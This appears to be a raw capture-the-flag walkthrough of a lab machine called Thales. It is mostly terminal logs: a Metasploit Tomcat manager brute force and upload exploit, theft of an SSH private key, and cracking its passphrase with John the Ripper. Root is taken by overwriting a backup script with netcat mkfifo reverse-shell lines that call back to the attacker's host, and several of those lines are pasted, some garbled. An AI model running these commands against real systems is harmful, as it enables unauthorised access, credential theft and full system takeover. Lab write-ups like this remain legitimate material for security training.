 kali : 172.18.135.136

thales : 172.18.135.107

reconnaissance

 sudo netdiscover

Currently scanning: 192.168.0.0/16   |   Screen View: Unique Hosts                                                                                                
                                                                                                                                                                   
 21 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 1260                                                                                                 
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 172.18.135.180  2e:f9:ca:a8:36:6b     15     900  Unknown vendor                                                                                                  
 172.18.135.107  08:00:27:d7:4b:1a      6     360  PCS Systemtechnik GmbH                                                                                          

open msfconsole
 search tomcat login

Matching Modules
================

   #  Name                                     Disclosure Date  Rank    Check  Description
   -  ----                                     ---------------  ----    -----  -----------
   0  auxiliary/scanner/http/tomcat_mgr_login  .                normal  No     Tomcat Application Manager Login Utility

save  username and port
msf auxiliary(scanner/http/tomcat_mgr_login) > 172.85.135.107
[-] Unknown command: 172.85.135.107. Run the help command for more details.
msf auxiliary(scanner/http/tomcat_mgr_login) > set rhost 172.85.135.107
rhost => 172.85.135.107
msf auxiliary(scanner/http/tomcat_mgr_login) > set username tomcat
username => tomcat
msf auxiliary(scanner/http/tomcat_mgr_login) > set verbose false
verbose => false
msf auxiliary(scanner/http/tomcat_mgr_login) >  run
^C[*] Caught interrupt from the console...
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/tomcat_mgr_login) > set rhost 172.18.135.107
rhost => 172.18.135.107
msf auxiliary(scanner/http/tomcat_mgr_login) > run
[+] 172.18.135.107:8080 - Login Successful: tomcat:role1
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/http/tomcat_mgr_login) > cd 
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
msf exploit(multi/http/tomcat_mgr_upload) >  set rhost 172.18.135.107
rhost => 172.18.135.107
msf exploit(multi/http/tomcat_mgr_upload) > set rport 8080
rport => 8080
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername tomcat
httpusername => tomcat
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword role1
httppassword => role1
msf exploit(multi/http/tomcat_mgr_upload) > run


meterpreter >  cd /home
meterpreter > ls
Listing: /home
==============

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040554/r-xr-xr--  4096  dir   2025-10-14 14:11:44 +0530  thales

meterpreter > cd thales
meterpreter > ls
Listing: /home/thales
=====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100001/--------x  457   fil   2021-10-14 17:00:45 +0530  .bash_history
100445/r--r--r-x  220   fil   2018-04-05 00:00:26 +0530  .bash_logout
100445/r--r--r-x  3771  fil   2018-04-05 00:00:26 +0530  .bashrc
040001/--------x  4096  dir   2021-08-15 22:28:00 +0530  .cache
040001/--------x  4096  dir   2021-08-15 22:28:00 +0530  .gnupg
040555/r-xr-xr-x  4096  dir   2021-08-15 23:20:29 +0530  .local
100445/r--r--r-x  807   fil   2018-04-05 00:00:26 +0530  .profile
100445/r--r--r-x  66    fil   2021-08-15 23:20:18 +0530  .selected_editor
040777/rwxrwxrwx  4096  dir   2021-08-17 02:04:04 +0530  .ssh
100445/r--r--r-x  0     fil   2021-10-14 16:15:25 +0530  .sudo_as_admin_successful
100444/r--r--r--  384   fil   2025-10-14 14:18:16 +0530  backup.sh
100444/r--r--r--  107   fil   2021-10-14 15:06:43 +0530  notes.txt
100000/---------  33    fil   2021-08-15 23:48:54 +0530  user.txt

meterpreter > 
meterpreter > cd .ssh

meterpreter > ls

Listing: /home/thales/.ssh


id_rsa
id_rsa.pub

meterpreter > download id_rsa /root/Desktop/ down

[+] Downloading: id_rsa → /root/Desktop/id_rsa

[+] Downloaded 1.72 KiB of 1.72 KiB (100.0%): id_rsa /root/Desktop/id_rsa

[*]

download : id_rsa /root/Desktop/id_rsa




open new tab 
(root kali)-[~/Desktop]

locate ssh2john

/usr/share/john/ssh2john.py

/usr/share/john/pycache/ssh2john.cpython-39.pyc

-(root kali)-(~/Desktop]

/usr/share/john/ssh2john.py  id_rsa > sshhash 

(root kali)-[~/Desktop]

john-wordlist=/usr/share/wordlists/rockyou.txt sshhash

Using default input encoding: UTF-8

Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])

Cost 1 (KDF/cipher [0=MD5/AES 1-MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes

Cost 2 (iteration count) is 1 for all loaded hashes.

Will run 4 OpenMP threads

Press 'q' or Ctrl-C to abort, almost any other key for status

vodka06       (id_rsa)

1g 0:00:00:00 DONE (2021-12-09 16:54) 2.173g/s 6217Kp/s 6217Kc/s 6217KC/s vodka142

Use the "--show" option to display all of the cracked passwords reliably

Session completed.




then 

meterpreter > shell
Process 1 created.
Channel 1 created.
python3 -c 'import pty;pty.spawn("/bin/bash")'
tomcat@miletus:/home/thales$  su thales
 su thales
Password: vodka06

thales@miletus:~$ ls
ls
backup.sh  notes.txt  user.txt
thales@miletus:~$ cd .ssh
cd .ssh
thales@miletus:~/.ssh$  id
 id
uid=1000(thales) gid=1000(thales) groups=1000(thales),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
thales@miletus:~/.ssh$ cd /home
cd /home
thales@miletus:/home$  ls
 ls
thales
thales@miletus:/home$ cd thales
cd thales
thales@miletus:~$ ls
ls
backup.sh  notes.txt  user.txt
thales@miletus:~$  cat user.txt
 cat user.txt
a837c0b5d2a8a07225fd9905f5a0e9c4
thales@miletus:~$  cat notes.txt

 then open malicious reverse shell 
thales@miletus:~$ cat /usr/local/bin/backup.sh
cat /usr/local/bin/backup.sh
#!/bin/bash
####################################
#
# Backup to NFS mount script.
#
####################################

# What to backup. 
backup_files="/opt/tomcat/"

# Where to backup to.
dest="/var/backups"

# Create archive filename.
day=$(date +%A)
hostname=$(hostname -s)
archive_file="$hostname-$day.tgz"

# Print start status message.
echo "Backing up $backup_files to $dest/$archive_file"
date
echo

# Backup the files using tar.
tar czf $dest/$archive_file $backup_files

# Print end status message.
echo
echo "Backup finished"
date

# Long listing of files in $dest to check file sizes.
ls -lh $dest
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.16 1234 p/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.7 1234 p/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.16 1234  >/tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.16 8888 >/tmp/f
rm /tmp/f;mkfifo /tmp/ficat /tmp/fl/bin/sh-i 2>&1 nc 192.168.1.7 8888 >/tmp/f
rm /tmp/f;mkfifo /tmp/ficat /tmp/fl/bin/sh-i 2>&1 |nc 192.168.1.7 8888 >/tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.7 8888 >/tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.7 8888 >/tmp/f
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.7 8888 >/tmp/f
 
for malicious reverse shell 

thales@miletus:~$ echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 172.18.135.136 4444 >/tmp/f'  > /usr/local/bin/backup.sh
<8.135.136 4444 >/tmp/f'  > /usr/local/bin/backup.sh
thales@miletus:~$  cd /usr/local/bin
 cd /usr/local/bin
thales@miletus:/usr/local/bin$ ./backup.sh
./backup.sh
rm: remove write-protected fifo '/tmp/f'? 

mkfifo: cannot create fifo '/tmp/f': File exists
./backup.sh: line 1: /tmp/f: Permission denied
 cat ./backup.sh
 cat ./backup.sh

[*] 172.18.135.107 - Meterpreter session 1 closed.  Reason: Died

listener on :
nc -lvp 4444 
listening on [any] 4444 ...



172.18.135.107: inverse host lookup failed: Unknown host
connect to [172.18.135.136] from (UNKNOWN) [172.18.135.107] 33230
/bin/sh: 0: can't access tty; job control turned off
# # # # 
# shell
/bin/sh: 5: shell: not found
# pyhton3 -c 'import pty;pty.spawn(/bin/bash")'
/bin/sh: 6: pyhton3: not found
# python3 -c 'import pty;pty.spawn("/bin/bash")'
root@miletus:~# ls
ls
root.txt
root@miletus:~# cat root.txt
cat root.txt
3a1c85bebf8833b0ecae900fb8598b17
root@miletus:~# 


i find second flag



